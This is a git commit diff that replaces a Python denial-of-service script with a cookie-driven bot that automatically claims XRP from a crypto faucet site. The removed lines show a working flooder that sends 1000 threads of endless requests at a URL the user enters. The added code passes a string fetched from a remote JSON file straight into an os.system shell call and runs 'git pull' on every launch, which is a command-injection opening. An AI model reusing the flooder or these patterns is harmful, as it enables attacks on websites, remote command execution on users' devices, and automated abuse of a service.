66f4b0c121f572956fc04815eb748c7dc6e62feb
Tanjiro Kamado <120044797+haxkx@users.noreply.github.com>
2024-04-12 09:57:13 +0530

    Update ddos.py

--- test/ddos.py
+++ test/ddos.py
@@ -1,59 +1,137 @@
-import threading
-import requests
-import os
-import time
-import sys
-import webbrowser
-from fake_useragent import UserAgent
+#!/usr/bin/python3
+try:
+    from requests.exceptions import RequestException
+    from rich.console import Console
+    import requests, time, os, json
+    from rich.panel import Panel
+    from rich import print
+except (Exception) as e:
+    exit(f"[Error]{str(e).capitalize()}!")
 
+COOKIES, SUKSES, GAGAL, XRP = {
+    "KEY": None
+}, [], [], {
+    "KEY": 0.000000
+}
 
-E = '\033[1;31m'
-B = '\033[2;36m'
-G = '\033[1;32m'
-S = '\033[1;33m'
-F = '\033[1;32m'  # Ø§Ø®Ø¶Ø±
-B = "\033[1;30m"  # Black
-R = "\033[1;31m"  # Red
-G = "\033[1;32m"  # Green
-Y = "\033[1;33m"  # Yellow
-Bl = "\033[1;34m"  # Blue
-P = "\033[1;35m"  # Purple
-C = "\033[1;36m"  # Cyan
-W = "\033[1;37m"  # White
-PN = "\033[1;35m"  # PINK
+def BANNER():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(Panel("""[bold red]●[bold yellow] ●[bold green] ●[/]
+[bold red]        __  _____   _  __ __ ___  
+   / / / /   | | |/ // //_/ |/ /
+  / /_/ / /| | |   // ,<  |   / 
+ / __  / ___ |/   |/ /| |/   |  
+/_/ /_/_/  |_/_/|_/_/ |_/_/|_|  
+                                
+        [italic white on red]Free XRP Tokens - Welcome To Haxkx""", style="bold bright_black", width=56))
 
-def to(s):
-    for char in s + "\n":
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(23.0 / 8000)
+class CLAIM:
 
-to(
-    f"""{G}|{C}=============================================={G}|
-{G}| Creator     :  @toxic_tanji & @haxkx {G}         |
-{G}| {Y}Tools      :  Ddos Attack       {G}   |
-{G}| {PN}Expire     :  LIFETIME {G}          |
-{G}| {W}Link       :  https://t.me/haxkx{G} |
-{G}|{C}=============================================={G}|"""
-)
+    def __init__(self) -> None:
+        pass
 
-webbrowser.open("https://t.me/haxkx")
+    def EXECUTION(self):
+        with requests.Session() as r:
+            r.headers.update({
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Accept-Encoding': 'gzip, deflate',
+                'Cache-Control': 'max-age=0',
+                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-Mode': 'navigate',
+                'dnt': '1',
+                'Connection': 'keep-alive',
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 14; RMX3706 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-User': '?1',
+                'Referer': 'https://faucetearner.org/dashboard.php',
+                'Host': 'faucetearner.org',
+            })
+            response = r.get('https://faucetearner.org/faucet.php', cookies = {
+                'Cookie': COOKIES['KEY']
+            })
+            r.headers.update({
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Content-Type': 'application/json',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-Mode': 'cors',
+                'Host': 'faucetearner.org',
+                'Origin': 'https://faucetearner.org',
+            })
+            response2 = r.post('https://faucetearner.org/api.php?act=faucet', data = {}, cookies = {
+                'Cookie': COOKIES['KEY']
+            })
+            if 'congratulations' in str(response2.text).lower():
+                try: # Congratulations on receiving 0.000000 It has been deposited into your account balance and can be viewed on the dashboard!
+                    self.XRP_earn = (str(response2.text).split(' XRP')[0].split('0.')[1])
+                except (IndexError):
+                    self.XRP_earn = ("0.000000")
+                XRP.update({
+                    "KEY": f"0.{self.XRP_earn}"
+                })
+                print(Panel(f"[italic green]Congratulations on receiving {XRP['KEY']} XRP, It has been deposited into your account balance and can be viewed on the dashboard!!", style="bold bright_black", width=56, title=">>> Sucess <<<"))
+                for sleep in range(60, 0, -1):
+                    print(f"[bold bright_black]   ╰─>[bold green] {sleep}[bold white]/[bold green]{XRP['KEY']}[bold white] Success:-[bold green]{len(SUKSES)}[bold white] Problem:-[bold red]{len(GAGAL)}     ", end='\r')
+                    time.sleep(1.0)
+                SUKSES.append(f'{response2.text}')
+                return ("0_0")
+            elif 'you have already' in str(response2.text).lower():
+                print(Panel(f"[italic red]You have already claimed, please wait for the next wave!", style="bold bright_black", width=56, title=">>> Problem <<<"))
+                time.sleep(30)
+                GAGAL.append(f'{response2.text}')
+                return ("0_-") # You have already claimed, please wait for the next wave!
+            else:
+                print(Panel(f"[italic red]{str(response2.text).capitalize()}!", style="bold bright_black", width=56, title=">>> Error <<<"))
+                return ("-_-")
 
-def send_request(url):
-    while True:
+    def CHECK_LOGIN(self):
+        BANNER()
+        if COOKIES["KEY"] == None:
+            print(Panel(f"[italic white]Enter your Faucetearner account cookies and make sure your Faucetearner account is logged in", style="bold bright_black", width=56, title=">>> Enter Cookies 🍪<<<", subtitle="╭──────", subtitle_align="left"))
+            self.cookies = Console().input("[bold bright_black]   ╰─> ")
+            if len(self.cookies) != 0:
+                COOKIES.update({
+                    "KEY": f"{self.cookies}"
+                })
+                return ("0_0")
+            else:
+                print(Panel(f"[italic red]The filling of cookies must be done correctly and validly. Empty or incorrect data can hinder the next process!", style="bold bright_black", width=56, title=">>> Must not be empty <<<"))
+                exit()
+        else:
+            return ("0_0")
+
+    def XRP(self):
         try:
-            response = requests.get(url)
-            print(f"Attack Done ✅ to {url}")
-        except requests.exceptions.RequestException as e:
-            print(f"Error sending attack to {url}: {e}")
+            self.CHECK_LOGIN()
+            print(Panel(f"[italic white]XRP token mining is currently ongoing. You can stop the process anytime by pressing the CTRL + Z button.", style="bold bright_black", width=56, title=">>> Note <<<"))
+            while True:
+                try:
+                    self.EXECUTION()
+                except (RequestException):
+                    print("[bold bright_black]   ╰─>[bold red] Connection problem !", end='\r')
+                    time.sleep(10.5)
+                    continue
+                except (KeyboardInterrupt):
+                    print("                                                       ", end='\r')
+                    time.sleep(2.5)
+                    continue
+        except (Exception) as e:
+            print(Panel(f"[italic red]{str(e).capitalize()}!", style="bold bright_black", width=56, title=">>> Error <<<"))
+            exit()
 
-def launch_attack(url, num_threads):
-    for _ in range(num_threads):
-        threading.Thread(target=send_request, args=(url,)).start()
-
-if __name__ == "__main__":
-    target_url = input("Baby Link dalo 🤤🌚=>: ")
-    num_threads = 1000
-
-    launch_attack(target_url, num_threads)
-    
+if __name__ == '__main__':
+    try:
+        if os.path.exists("/storage/emulated/0/Download/telegram/haxkx.json") == False:
+            youtube_url = json.loads(requests.get('https://raw.githubusercontent.com/haxkx/fastfollow/main/Data/haxkx.json').text)['Link']
+            os.system(f'xdg-open {youtube_url}')
+            with open('/storage/emulated/0/Download/telegram/haxkx.json', 'w') as w:
+                w.write(json.dumps({
+                    "Status": True
+                }))
+            w.close()
+            time.sleep(3.5)
+        os.system('git pull')
+        CLAIM().XRP()
+    except (KeyboardInterrupt, KeyboardInterrupt):
+        exit()
